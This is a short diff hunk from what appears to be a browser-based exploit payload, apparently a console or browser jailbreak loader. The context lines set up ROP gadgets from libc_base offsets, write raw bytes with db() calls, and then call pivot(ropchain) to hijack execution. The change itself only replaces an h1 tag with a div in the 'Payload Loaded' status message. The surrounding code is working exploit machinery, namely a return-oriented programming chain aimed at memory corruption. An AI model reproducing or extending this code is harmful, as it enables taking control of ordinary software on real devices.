@@ -7344,7 +7344,7 @@ set_gadgets([libc_base+248252,libc_base+50775,libc_base+793877,ropchain+219976,w
 db([0, 0]);
 db([5, 0, 0, 0, 0, 0]);
 if (typeof LoadedMSG == 'undefined'){LoadedMSG = "Payload Loaded ✔";}
-window.msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>"+LoadedMSG+"</h1>";
+window.msgs.innerHTML="<div>"+LoadedMSG+"</div>";
 setTimeout(function(){
 pivot(ropchain);
 },500);
